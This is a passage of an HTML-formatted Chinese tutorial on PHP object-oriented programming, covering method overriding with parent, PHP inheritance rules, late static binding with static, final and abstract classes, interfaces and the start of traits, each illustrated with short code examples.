class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;<span class="comment">//不会报错，因为本质不存在重写（父类Human::show没有被继承）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>重写是指子类拥有特殊的情况，一般是需要在父类的基础上进行扩展，此时如果想要继续保证父类被重写的方法继续执行（默认永远只访问子类重写的新方法），需要在子类重写方法的时候使用parent关键字</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//强制调用父类被重写方法</span></span><br><span class="line">        <span class="built_in">parent</span>::show();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//扩展业务逻辑</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：parent不能访问父类的属性，可以访问静态属性、静态方法、类常量和普通方法</p><blockquote><p><strong>总结</strong></p></blockquote><ol><li>重写override是一种在子类中定义父类同名成员的操作</li><li>公有、受保护的属性重写是直接覆盖父类成员，私有属性不会被覆盖；公有、收保护的方法会被重写，但是私有方法不会被重写（私有方法本质没有被继承）</li><li>重写的要求</li></ol><ul><li>子类控制权不能高于父类控制权</li><li>PHP7中要求被重写的方法必须与父类保持参数一致（数量和类型）</li></ul><ol start="4"><li>方法被重写后，访问调用的都是子类方法，如果想要访问父类方法，可以通过在子类方法中使用parent关键字来强制访问父类方法</li><li>parent不能用于访问父类的属性（静态属性可以）</li></ol><hr><blockquote><p><strong>思考</strong>：PHP继承与其他面向对象语言的继承有不同吗？</p></blockquote><blockquote><p><strong>引入</strong>：PHP因为是自面向过程发展而来，所以并非完全使用面向对象的思想，因此PHP的继承有一些自己的特点。</p></blockquote><h3 id="4-PHP继承特点【掌握】"><a href="#4-PHP继承特点【掌握】" class="headerlink" title="4. PHP继承特点【掌握】"></a><strong>4. PHP继承特点【掌握】</strong></h3><blockquote><p><strong>定义</strong>：PHP继承与其他纯面向对象（从设计之初就完全由面向对象思维支配）编程语言是有一些不一样的。</p></blockquote><ol><li>PHP中继承只能单继承：即子类只有一个父类（有些语言支持多继承）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ladyboy</span> <span class="keyword">extends</span> <span class="title">Man</span>,<span class="title">Woman</span></span>&#123;&#125;<span class="comment">//PHP中错误，不允许继承多个父类</span></span><br></pre></td></tr></table></figure><ol start="2"><li>PHP若想继承多个类，可以使用链式继承</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span> <span class="keyword">extends</span> <span class="title">Man</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ladyboy</span> <span class="keyword">extends</span> <span class="title">Woman</span></span>&#123;&#125;<span class="comment">//Ladyboy包含了Man和Woman类中所有可继承的成员</span></span><br></pre></td></tr></table></figure><ol start="3"><li>PHP中继承只有私有方法不能被继承</li><li>PHP允许子类继承父类的构造方法和析构方法</li></ol><blockquote><p><strong>总结</strong>：PHP中的继承与传统的面向对象继承有着一些小区别，大家在使用继承的时候要严格遵守PHP的继承规则</p></blockquote><hr><blockquote><p><strong>思考</strong>：self关键字是用于在类内部代替类的，代替的是当前方法所在的类本身，随着继承的实现，如果子类在访问父类的方法的时候，self到底代替的是谁呢？</p></blockquote><blockquote><p><strong>引入</strong>：self是一种静态绑定，换言之就是当类进行编译的时候self已经明确绑定了类名，因此不论多少继承，也不管是子类还是父类自己来进行访问，self代表都是当前类。如果想要选择性的来支持来访者，就需要使用<code>静态延迟绑定</code></p></blockquote><h3 id="5-静态延迟绑定【掌握】"><a href="#5-静态延迟绑定【掌握】" class="headerlink" title="5. 静态延迟绑定【掌握】"></a><strong>5. 静态延迟绑定【掌握】</strong></h3><blockquote><p><strong>定义</strong>：静态延迟绑定，即在类内部用来代表类本身的关键字部分不是在类编译时固定好，而是当方法被访问时动态的选择来访者所属的类。静态延迟绑定就是利用<code>static</code>关键字代替静态绑定self，静态延迟绑定需要使用到静态成员的重写</p></blockquote><ol><li>静态延迟绑定：使用static关键字代替self进行类成员访问</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$name</span> = <span class="string">&#x27;Human&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//静态绑定</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable">$name</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">//静态延迟绑定</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">static</span>::<span class="variable">$name</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写父类静态属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$name</span> = <span class="string">&#x27;Man&#x27;</span>;<span class="comment">//静态属性因为存储在类内部，因此不会覆盖</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类访问</span></span><br><span class="line">Man::showName();<span class="comment">//输出Human和Man</span></span><br></pre></td></tr></table></figure><ol start="2"><li>静态延迟绑定一定是通过继承后的子类来进行访问才有效果</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line">Human::showName();<span class="comment">//输出Human和Human（此时没子类的事儿）</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>静态延迟绑定是指通过static关键字进行类静态成员的访问，是指在被访问时才决定到底使用哪个类</li><li>静态延迟绑定对比的是静态绑定self</li><li>静态延迟绑定的意义是用来保证访问的静态成员是根据调用类的不同而选择不同的表现</li></ol><hr><blockquote><p><strong>思考</strong>：继承是利用了一些共性以及共性大小来拆分的父类和子类，父类的目的是为了给子类提供一些共性代码，子类可以从父类继承，而且还可以有子类无限继承子类。继承的目的一是利用父类提供的公共代码，二是实现自身需求的扩展，如果子类无限被继承会有什么效果呢？</p></blockquote><blockquote><p><strong>引入</strong>：事务的划分首先不可能无限细化，因此肯定是不需要无限的出现子类的。一旦无限出现子类，那么就会导致代码的执行效率大大降低；而且可能被某些无关类继承从而出现安全问题，但是从代码设计的角度来讲是无法限制开发者的。因此PHP提供了一种终结机制，让类无法被继承。</p></blockquote><h3 id="6-最终类Final【掌握】"><a href="#6-最终类Final【掌握】" class="headerlink" title="6. 最终类Final【掌握】"></a><strong>6. 最终类Final【掌握】</strong></h3><blockquote><p><strong>定义</strong>：最终类，使用final关键字修饰类名，表示此类不可以被继承。</p></blockquote><ol><li>基本语法：final class 类名</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>最终类无法被继承</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man18</span> <span class="keyword">extends</span> <span class="title">Man</span></span>&#123;&#125;<span class="comment">//致命错误：无法从final类继承</span></span><br></pre></td></tr></table></figure><ol start="3"><li>final关键字不止修饰类表示类不可被继承，还能修饰方法，表示方法不能被重写</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//普通方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="function"><span class="keyword">function</span> <span class="title">walk</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//最终方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//没问题</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">walk</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//致命错误：不能重写父类中的最终方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>final关键字修饰的类表示无法被继承</li><li>final关键字还可以修饰方法，表示方法不能子类重写（通常类不会使用final关键字）</li><li>final修饰类表示不希望类再出现子类，可以很好保护类的内部结构不被暴露</li><li>final修饰方法表示不希望方法被修改，可以在一个更高的维度来保证同类事务的共同表现</li></ol><hr><blockquote><p><strong>思考</strong>：在一个项目中，如果架构师在前面给定义了一些父类，而且希望所有的子类都遵循父类的设置，有没有什么办法可以限制呢？</p></blockquote><blockquote><p><strong>引入</strong>：理论上来讲没有系统性的办法能够严格去规范程序员必须怎么实现，但是大家如果都遵循规则的话，那么可以利用父类来强制规范子类必须完成要做的事情，这个时候需要用到<code>抽象类</code></p></blockquote><h3 id="7-抽象类Abstract【掌握】"><a href="#7-抽象类Abstract【掌握】" class="headerlink" title="7. 抽象类Abstract【掌握】"></a><strong>7. 抽象类Abstract【掌握】</strong></h3><blockquote><p><strong>定义</strong>：抽象类，使用abstract关键字修饰的类，表示该类只能被继承，不能被实例化</p></blockquote><ol><li>基本语法：使用abstract关键字修饰类</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>抽象类无法被实例化</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> Human();<span class="comment">//致命错误，抽象类不能被实例化</span></span><br></pre></td></tr></table></figure><ol start="3"><li>抽象类只能被继承</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象类（父类）</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//正确</span></span><br></pre></td></tr></table></figure><ol start="4"><li>abstract关键字还可以用来修饰方法（抽象方法），abstract修饰的方法不能有方法体，而且有抽象方法的类必须声明为抽象类</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象方法抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义抽象方法：没有方法体</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//普通方法有方法体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>抽象方法因为要被子类继承实现，所以不能使用private修饰（私有方法不会被继承）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//抽象方法</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;<span class="comment">//错误：抽象方法不能私有化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>子类继承抽象类后，如果抽象类中有抽象方法，那么子类必须选择自己成为抽象类或者实现抽象方法（所有抽象方法）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象方法抽象类(父类)</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义抽象方法：没有方法体</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//普通方法有方法体</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类1：抽象类继承抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//正常继承</span></span><br><span class="line"><span class="comment">//子类2：子类实现父类所有抽象方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span> <span class="keyword">extends</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="comment">//实现从祖父类继承的eat抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>使用abstract修饰的类叫做抽象类</li><li>抽象类不可以被实例化，只能被继承</li><li>因为抽象类无法被实例化，因此私有成员在类中没有实质意义（还需要额外提供受保护或者公有方法来实现访问）</li><li>抽象类的目的是用来规范子类（通常必配抽象方法）</li><li>abstract还可以修饰方法，称之为抽象方法：抽象方法所在的类必须是抽象类，抽象方法不能有方法体</li><li>有抽象方法的抽象类被继承时子类要么自身是抽象类，要么实现所有抽象方法</li><li>抽象类这种结构管理，需要耗费较多的架构和初始代码，通常在比较大型或者规范的项目中才会使用</li></ol><hr><blockquote><p><strong>思考</strong>：在大型项目中，如果想要规定某些类必须有某些方法，我们可以使用抽象类来进行规范吗？</p></blockquote><blockquote><p><strong>引入</strong>：抽象类的目的就是用来规范一些共性子类的结构，必须实现某些指定的方法的。在PHP中，还有一种专门用来规范类内部实现方法的结构，叫做<code>接口</code></p></blockquote><h3 id="8-接口Interface【掌握】"><a href="#8-接口Interface【掌握】" class="headerlink" title="8. 接口Interface【掌握】"></a><strong>8. 接口Interface【掌握】</strong></h3><blockquote><p><strong>定义</strong>：接口，使用interface关键字定义，与类类似，专门用来规范一些共性类必须实现的方法</p></blockquote><ol><li>接口定义：使用interface关键字，后跟接口名字（与类结构一样）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Human</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>接口不是类，不可以被实例化</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Human();<span class="comment">//致命错误，接口不能被实例化</span></span><br></pre></td></tr></table></figure><ol start="3"><li>接口实现：接口是用来规范类必须完成的事情，所以接口只能被类实现：implements</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">implements</span> <span class="title">Human</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>接口成员：接口中只能定义公有抽象方法和接口常量</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//接口常量</span></span><br><span class="line">    <span class="keyword">const</span> NAME = <span class="string">&#x27;人&#x27;</span>;</span><br><span class="line">    <span class="comment">//接口抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//错误示例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//错误：接口中的方法必须为抽象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;   <span class="comment">//错误：接口中不能有属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;<span class="comment">//错误：接口中不能有静态属性（成员属性）</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">walk</span>(<span class="params"></span>)</span>;<span class="comment">//错误：接口方法必须为公有抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>接口成员方法必须被实现的子类实现或者类为抽象类，接口常量可以直接在实现类中方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">   <span class="comment">//接口常量</span></span><br><span class="line">    <span class="keyword">const</span> NAME = <span class="string">&#x27;人&#x27;</span>;</span><br><span class="line">    <span class="comment">//接口抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">implements</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//必须实现接口所有抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::NAME;<span class="comment">//可以访问接口常量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象类实现接口</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Ladyboy</span> <span class="keyword">implements</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//正常实现</span></span><br></pre></td></tr></table></figure><ol start="6"><li>实现接口的类成员，不允许重写接口中的常量，不允许增加接口方法的控制权限</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span> <span class="keyword">implements</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写接口常量</span></span><br><span class="line">    <span class="keyword">const</span> NAME = <span class="string">&#x27;女人&#x27;</span>;  <span class="comment">//错误：不允许重写接口常量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//强化接口方法控制</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//错误：接口方法不允许使用其他访问修饰限定符，必须使用public</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>接口可以继承接口：extends，而且接口可以多继承接口</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">walk</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//单继承</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">//多继承</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Ape</span> <span class="keyword">extends</span> <span class="title">Human</span>,<span class="title">Animal</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>接口是使用interface关键字定义，与类结构类似</li><li>接口只能被类实现</li><li>接口成员只有两种：接口常量和公有抽象方法（没有方法体：不需要abstract关键字）</li><li>类实现接口的时候，必须实现接口中所有的抽象方法（或者抽象类实现）</li><li>接口中的成员不能被实现接口的类进行重写（接口常量）和权限更高（受保护或者私有化接口方法）</li><li>接口可以继承接口，而且可以多继承</li><li>接口是在更大型的项目中，为了保证底层的实现而设定的规范，通常是抽象类实现接口，增加必要成员，然后让实际业务类去继承抽象类。</li></ol><hr><blockquote><p><strong>思考</strong>：PHP中继承是单继承，如果某个类有成员要被其他类使用，就需要成为其他类的父类才行，这样可能会导致继承链很长，合适吗？</p></blockquote><blockquote><p><strong>引入</strong>：从继承的角度出发，继承链可以解决问题，但是的确效率会打折扣。同时，如果某些功能是共性使用，但是并不符合继承条件（不属于同一类事务），那么使用继承也有所违背面向对象规则，此时可以使用PHP提供的另外一种代码复用技术<code>trait</code></p></blockquote><h3 id="9-trait代码复用【掌握】"><a href="#9-trait代码复用【掌握】" class="headerlink" title="9. trait代码复用【掌握】"></a><strong>9. trait代码复用【掌握】</strong></h3><blockquote><p><strong>定义</strong>：<code>Trait</code> 是为类似 PHP 的单继承语言而准备的一种代码复用机制。trait可以使得单继承语言拜托为了复用而不得不继承的尴尬，让面向对象变得更加纯粹。</p></blockquote><ol><li>trait是一种类似class的关键字</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>trait内部可以拥有一个类能拥有成员属性（包含静态），成员方法（包含静态），但不能有类常量</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$how</span>;<span class="comment">//允许定义，但是实际不用</span></span><br><span class="line">    <span 